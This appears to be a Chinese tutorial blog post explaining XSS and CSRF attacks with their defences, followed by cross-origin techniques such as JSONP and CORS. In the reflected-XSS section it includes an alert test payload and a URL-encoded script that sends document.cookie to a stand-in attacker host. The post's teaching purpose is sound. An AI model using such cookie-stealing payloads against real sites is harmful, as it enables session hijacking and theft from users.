应后端同学要求，给大家分享一些稍微理论一点的知识，即前端跨域的知识。在讲跨域之前，先介绍一下前端的安全。
# 安全
## XSS攻击（跨站脚本攻击）
XSS(Cross Site Scripting)，跨站脚本攻击，XSS是常见的Web攻击技术之一。所谓的跨站脚本攻击指得是：恶意攻击者往Web页面里注入恶意script代码，用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取cookie信息、会话劫持等各种攻击。
### 反射型漏洞     
**一，例子说明**：    

1）通过程序参数输出传递的参数到HTML页面，则打开下面的网址将会返回一个消息提示：
请求：

```
http://你的网站/xss/message.php?send=Hello,World www.111cn.net!
```
返回：

```
Hello,World www.111cn.net!
```
2）如果此程序没有经过过滤等安全措施，则它将会很容易受到攻击。假如我们在原程序的URL的参数为，替换为我们用来测试的代码：
请求：

```
http://www.111cn.net /xss/message.php?send=<script>alert(‘xss’)</script>
```
返回：

```
<script>alert(‘xss’)</script>
```
这样，用户在浏览器打开的时候，就会运行我们的弹框了。由于这种漏洞需要发送一个包含了嵌入式JavaScript代码的请求，随后这些代码被反射给了发出请求的用户，因此被称为反射型XSS。攻击有效符合分别通过一个单独的请求与响应进行传送和执行，因为也被称为一阶XSS。    

**二，攻击案例：**
1. 用户正常登录Web应用程序，登录成功会得到一个会话信息的cookie：

```
Set-cookie:sessId = f16e1035c301aa099c971682d806c0c7 f16e1035c301aa099c971682d806c0c7
```

2. 攻击者将含有攻击代码的URL发送给被攻击人；

```
http://你的网站/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.你的网站/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E
```

3. 用户打开攻击者发送过来的ULR
4. Web应用程序执行用户发出的请求，同时也会执行该URL中所含的攻击者的JavaScript代码；
5. 例子中攻击者使用的攻击代码作用是将用户的cookie信息发送到cookie_save.php这个文件来记录下来；
6. 攻击者在得到用户的cookie信息后，将可以利用这些信息来劫持用户的会话。以该用户的身份进行登录     

### 存储式漏洞   
该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。
简单来说明一下存储型XSS的攻击基本流程:
1. 比如在某个论坛提供留言板功能，黑客在留言板内插入恶意的html或者Javascript代码，并且提交。
2. 网站后台程序将留言内容存储在数据中
3. 然后一个用户也访问这个论坛，并刷新了留言板，这时网站后台从数据库中读取了之前黑客的留言内容，并且直接插入在html页面中，这就可能导致了：黑客留言的脚本本身应该作为内容显示在留言板的，然后此时可能黑客的留言脚本被浏览器解释执行了。
4. 黑客的脚本可以用来他想要做的事情。例如通过javascript获取用户的cookie，根据这个cookie窃取用户信息，例如重新更改页面内容，假装让客户输入用户名，密码，然后提交到黑客的服务器等。
### 防御手段
不管是反射型还是存储型，XSS攻击的防御方法主要是两种 ：    
**一，对输入（和UR参数）进行过滤**   
**二，对输出进行编码**    
也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击。    
## CSRF
CSRF（Cross-site request forgery）跨站请求伪造，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。        

**攻击案例：**    
1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。      

**防御手段：**       

目前防御 CSRF 攻击主要有三种策略：    

**1. 验证 HTTP Referer 字段：**    

根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。    
在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。      

**2. 在请求地址中添加 token 并验证：**    

CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。    

**3. 在 HTTP 头中自定义属性并验证：**     

这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。
# 跨域
**什么是跨域：**    
跨域问题的产生，源于浏览器的安全设置。浏览器对于javascript的同源策略的限制,例如a.cn下面的js不能调用b.cn中的js,对象或数据(因为a.cn和b.cn是不同域),这样可以一定程序上防止恶意程序的入侵，但也就引起了有正常需求的跨域问题了。

**同源策略：**    
请求的url地址,必须与浏览器上的url地址处于同域上,也就是域名,端口,协议相同。如果我在本地上的域名是study.cn,请求另外一个域名一段数据，这个时候在浏览器上会报错。
![image](https://raw.githubusercontent.com/labsInsight/blogs/master/Resources/3-safe-cross.png)
    
跨域的解决方案有很多，目前常用的有：
1. **图片ping或script标签跨域**    
一个网页可以从任何网页加载图像，不用担心跨域不跨域，所以，我们就可以利用图片不受“同源限制”这一点进行跨域通信。     
因为，我们可以利用JS创建一个新的Image对象，并把src属性设置为指向请求的地址，通过监听onload和onerror事件来确定是否接受到了响应。响应的数据可以是任意内容，但通常是像素图或204响应。   
这种方式优点是很明显的：兼容性非常好，缺点就是：只能发生GET请求，而且无法获取响应文本。
2. **JSONP跨域**    
jsonp 全称是JSON with Padding,是为了解决跨域请求资源而产生的解决方案,是一种依靠开发人员创造出的一种非官方跨域数据交互协议。   
利用<script>元素的这个开放策略，网页可以得到从其他来源动态产生的 JSON 资料，而这种使用模式就是所谓的 JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。
3. **CORS**    
跨域资源共享（ CORS ）机制允许 Web 应用服务器进行跨域访问控制，从而使跨域数据传输得以安全进行。浏览器支持在 API 容器中（例如 XMLHttpRequest 或 Fetch ）使用 CORS，以降低跨域 HTTP 请求所带来的风险。CORS 需要客户端和服务器同时支持。目前，所有浏览器都支持该机制。    
与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。服务器一般需要增加如下响应头的一种或几种：

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
```
跨域请求默认不会携带Cookie信息，如果需要携带，请配置下述参数：

```
"Access-Control-Allow-Credentials": true
"withCredentials": true
```

4. **window.name+iframe**    
window.name通过在iframe（一般动态创建i）中加载跨域HTML文件来起作用。然后，HTML文件将传递给请求者的字符串内容赋值给window.name。然后，请求者可以检索window.name值作为响应。
5. **window.postMessage()**    
HTML5新特性，可以用来向其他所有的 window 对象发送消息。需要注意的是我们必须要保证所有的脚本执行完才发送 MessageEvent，如果在函数执行的过程中调用了它，就会让后面的函数超时无法执行。
6. **修改document.domain跨子域**    
前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用document.domain进行跨域，所以只能跨子域。 在根域范围内，允许把domain属性的值设置为它的上一级域。例如，在”aaa.xxx.com”域内，可以把domain设置为 “xxx.com” 但不能设置为 “xxx.org” 或者”com”。
7. **WebSocket**    
WebSocket protocol 是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很棒的实现。
8. **代理**    
同源策略是针对浏览器端进行的限制，可以通过服务器端来解决该问题：    
DomainA客户端（浏览器） ==> DomainA服务器 ==> DomainB服务器 ==> DomainA客户端（浏览器）   
### CORS跨域设置案例
我司采用的是CORS方案来进行跨域。    
CORS需要浏览器和服务器同时支持。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。**因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信**。        
    
浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。  
只要同时满足以下两大条件，就属于简单请求。

```
只要同时满足以下两大条件，就属于简单请求。

（1) 请求方法是以下三种方法之一：
    HEAD
    GET
    POST
    
（2）HTTP的头信息不超出以下几种字段：
    Accept
    Accept-Language
    Content-Language
    Last-Event-ID
    Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain
```
#### 简单请求
对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。    

```
GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

服务器根据这个值，决定是否同意这次请求。    
如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。    
如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。

```
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
```

#### 非简单请求
非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求（preflight）。

浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。    

服务器收到"预检"请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。
> 参考文档：    
阿里云：https://yq.aliyun.com/ziliao/29368    
CSDN安全博文：https://blog.csdn.net/stpeace/article/details/53512283    
CSDN跨域博文：https://blog.csdn.net/ligang2585116/article/details/73072868    
阮一峰老师：http://www.ruanyifeng.com/blog/2016/04/cors.html

